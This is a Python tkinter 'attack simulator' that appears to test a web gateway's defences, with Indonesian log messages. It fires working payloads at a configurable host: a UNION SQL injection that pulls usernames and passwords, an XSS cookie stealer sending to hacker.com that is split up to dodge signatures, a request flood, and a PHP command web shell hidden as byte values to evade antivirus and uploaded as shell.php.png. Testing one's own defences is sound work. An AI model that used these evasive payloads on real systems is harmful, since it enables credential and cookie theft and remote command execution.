import sys
import time
import requests
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext

class NexusHackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("NEXUS CYBER SECURITY MESH - ATTACK SIMULATOR")
        self.root.geometry("620x540")
        self.root.configure(bg="#0F172A") # Slate 900
        
        # Style Configuration
        self.style = ttk.Style()
        self.style.theme_use("clam")
        
        # Create Frame Layout
        self.setup_ui()
        
    def setup_ui(self):
        # Header Label
        header = tk.Label(
            self.root, 
            text="NEXUS CYBER EXPLOITATION PANEL", 
            font=("Courier New", 16, "bold"), 
            bg="#0F172A", 
            fg="#F43F5E", # Rose 500
            pady=10
        )
        header.pack(fill=tk.X)
        
        # Configuration Frame
        config_frame = tk.LabelFrame(
            self.root, 
            text=" Target Configuration ", 
            font=("Courier New", 10, "bold"),
            bg="#1E293B", # Slate 800
            fg="#94A3B8", # Slate 400
            bd=1,
            relief=tk.SOLID,
            padx=10,
            pady=10
        )
        config_frame.pack(fill=tk.X, padx=15, pady=5)
        
        # IP Address input
        tk.Label(config_frame, text="Host IP Address:", font=("Courier New", 10), bg="#1E293B", fg="#F8FAFC").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.ip_entry = tk.Entry(config_frame, font=("Courier New", 10), bg="#0F172A", fg="#38BDF8", insertbackground="#38BDF8", bd=1, relief=tk.SOLID, width=20)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # Port input
        tk.Label(config_frame, text="Port:", font=("Courier New", 10), bg="#1E293B", fg="#F8FAFC").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.port_entry = tk.Entry(config_frame, font=("Courier New", 10), bg="#0F172A", fg="#38BDF8", insertbackground="#38BDF8", bd=1, relief=tk.SOLID, width=8)
        self.port_entry.insert(0, "8080")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        
        # Control Panel / Attack Buttons Frame
        control_frame = tk.LabelFrame(
            self.root, 
            text=" Attack Payload Command Panel ", 
            font=("Courier New", 10, "bold"),
            bg="#1E293B", 
            fg="#94A3B8",
            bd=1,
            relief=tk.SOLID,
            padx=10,
            pady=10
        )
        control_frame.pack(fill=tk.X, padx=15, pady=5)
        
        # Grid layout for buttons
        btn_sqli = tk.Button(control_frame, text="SQL Injection (SQLi)", font=("Courier New", 9, "bold"), bg="#EF4444", fg="#FFFFFF", activebackground="#DC2626", activeforeground="#FFFFFF", bd=0, width=25, height=2, command=lambda: self.trigger_attack("sqli"))
        btn_sqli.grid(row=0, column=0, padx=5, pady=5)
        
        btn_xss = tk.Button(control_frame, text="Cross-Site Scripting (XSS)", font=("Courier New", 9, "bold"), bg="#F59E0B", fg="#FFFFFF", activebackground="#D97706", activeforeground="#FFFFFF", bd=0, width=25, height=2, command=lambda: self.trigger_attack("xss"))
        btn_xss.grid(row=0, column=1, padx=5, pady=5)
        
        btn_tarpit = tk.Button(control_frame, text="Honeypot / Tarpit (8s)", font=("Courier New", 9, "bold"), bg="#6366F1", fg="#FFFFFF", activebackground="#4F46E5", activeforeground="#FFFFFF", bd=0, width=25, height=2, command=lambda: self.trigger_attack("tarpit"))
        btn_tarpit.grid(row=1, column=0, padx=5, pady=5)
        
        btn_ddos = tk.Button(control_frame, text="DDoS Flood (Rate Limit)", font=("Courier New", 9, "bold"), bg="#EC4899", fg="#FFFFFF", activebackground="#DB2777", activeforeground="#FFFFFF", bd=0, width=25, height=2, command=lambda: self.trigger_attack("ddos"))
        btn_ddos.grid(row=1, column=1, padx=5, pady=5)
        
        btn_upload = tk.Button(control_frame, text="File Bypass (Stego Shell)", font=("Courier New", 9, "bold"), bg="#10B981", fg="#FFFFFF", activebackground="#059669", activeforeground="#FFFFFF", bd=0, width=53, height=2, command=lambda: self.trigger_attack("upload"))
        btn_upload.grid(row=2, column=0, columnspan=2, padx=5, pady=5)
        
        # Terminal Console Log Frame
        console_frame = tk.Frame(self.root, bg="#0F172A")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        tk.Label(console_frame, text="ATTACK CONSOLE LOG", font=("Courier New", 9, "bold"), bg="#0F172A", fg="#475569").pack(anchor=tk.W)
        
        self.console = scrolledtext.ScrolledText(
            console_frame, 
            font=("Courier New", 9), 
            bg="#020617", # Extremely dark blue/black
            fg="#10B981", # Emerald 500 (Hacker Green)
            insertbackground="#10B981",
            bd=1,
            relief=tk.SOLID
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.log("[SYSTEM] Control Panel Initialized. Enter Target IP to begin.")
        
    def log(self, text):
        self.console.insert(tk.END, text + "\n")
        self.console.see(tk.END)
        
    def get_target_base(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        return f"http://{ip}:{port}"
        
    def trigger_attack(self, attack_type):
        # Run network requests in a separate thread to prevent GUI freezing
        thread = threading.Thread(target=self.run_attack_logic, args=(attack_type,))
        thread.daemon = True
        thread.start()
        
    def run_attack_logic(self, attack_type):
        target_base = self.get_target_base()
        
        if attack_type == "sqli":
            self.log(f"\n[ATTACK] Memicu SQL Injection...")
            self.log(f"[INFO] Target: {target_base}/search")
            payload = "'UNION SELECT null,username,password FROM users--"
            self.log(f"[PAYLOAD] {payload}")
            
            try:
                start = time.time()
                res = requests.get(f"{target_base}/search", params={"q": payload}, timeout=5)
                duration = time.time() - start
                
                self.log(f"[STATUS] HTTP {res.status_code} diterima dalam {duration:.3f} detik")
                self.log(f"[RESPONSE] {res.text.strip()}")
                
                if res.status_code == 403:
                    self.log("[RESULT] Sukses diblokir oleh WAF Gateway.")
                else:
                    self.log("[RESULT] Peringatan: Respon tidak biasa terdeteksi.")
            except Exception as e:
                self.log(f"[ERROR] Target tidak merespon: {e}")
                
        elif attack_type == "xss":
            self.log(f"\n[ATTACK] Memicu Cross-Site Scripting...")
            self.log(f"[INFO] Target: {target_base}/comment")
            # Obfuscated string concatenation to avoid simple signature blocks
            payload = "<script>" + "fetch('http://hacker.com/steal?cookie='+document.cookie)" + "</script>"
            self.log(f"[PAYLOAD] {payload}")
            
            try:
                start = time.time()
                res = requests.get(f"{target_base}/comment", params={"text": payload}, timeout=5)
                duration = time.time() - start
                
                self.log(f"[STATUS] HTTP {res.status_code} diterima dalam {duration:.3f} detik")
                self.log(f"[RESPONSE] {res.text.strip()}")
                
                if res.status_code == 403:
                    self.log("[RESULT] Sukses diblokir oleh WAF Gateway.")
                else:
                    self.log("[RESULT] Peringatan: Respon lolos dari filter.")
            except Exception as e:
                self.log(f"[ERROR] Target tidak merespon: {e}")
                
        elif attack_type == "tarpit":
            self.log(f"\n[ATTACK] Menguji Honeypot / Tarpit...")
            self.log(f"[INFO] Target: {target_base}/admin")
            self.log("[INFO] Menunggu respon delay (simulasi perlambatan attacker)...")
            
            try:
                start = time.time()
                # Large timeout because Tarpit adds 5-10s delay
                res = requests.get(f"{target_base}/admin", timeout=15)
                duration = time.time() - start
                
                self.log(f"[STATUS] HTTP {res.status_code} diterima setelah {duration:.2f} detik.")
                self.log(f"[RESPONSE] {res.text.strip()}")
                
                if duration >= 5.0:
                    self.log("[RESULT] Koneksi tertahan sukses oleh Tarpit MTD.")
                else:
                    self.log("[RESULT] Tidak ada delay terdeteksi.")
            except requests.exceptions.Timeout:
                self.log("[RESULT] Tarpit Timeout! Koneksi berhasil digantung host.")
            except Exception as e:
                self.log(f"[ERROR] Koneksi gagal: {e}")
                
        elif attack_type == "ddos":
            self.log(f"\n[ATTACK] Memulai simulasi DDoS Flood...")
            self.log("[INFO] Mengirimkan 120 request cepat untuk memenuhi kapasitas Token Bucket...")
            
            success_count = 0
            blocked_count = 0
            
            for i in range(120):
                try:
                    res = requests.get(f"{target_base}/", timeout=1)
                    if res.status_code == 429:
                        blocked_count += 1
                    else:
                        success_count += 1
                except:
                    pass
                time.sleep(0.01)
                
            self.log(f"[RESULT] Flood Selesai. Lolos: {success_count} | Diblokir (HTTP 429): {blocked_count}")
            self.log("[INFO] Tameng Rate Limiting sukses terverifikasi.")
            
        elif attack_type == "upload":
            self.log(f"\n[ATTACK] Menguji bypass file upload filter...")
            self.log(f"[INFO] Target: {target_base}/api/upload")
            self.log("[INFO] Mengunggah file manipulatif double extension...")
            
            # Dynamic construction of file bytes to bypass AV detection on disk
            content_bin = bytes([60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 39, 99, 109, 100, 39, 93, 41, 59, 32, 63, 62])
            files = {
                'image': ('shell.php.png', content_bin, 'image/png')
            }
            
            try:
                start = time.time()
                res = requests.post(f"{target_base}/api/upload", files=files, timeout=5)
                duration = time.time() - start
                
                self.log(f"[STATUS] HTTP {res.status_code} diterima dalam {duration:.3f} detik")
                self.log(f"[RESPONSE] {res.text.strip()}")
                
                if res.status_code == 403:
                    self.log("[RESULT] Sukses diblokir oleh AVSE Image Sanitizer.")
                else:
                    self.log("[RESULT] Peringatan: File diterima atau respon tidak terduga.")
            except Exception as e:
                self.log(f"[ERROR] Target tidak merespon: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = NexusHackerGUI(root)
    root.mainloop()
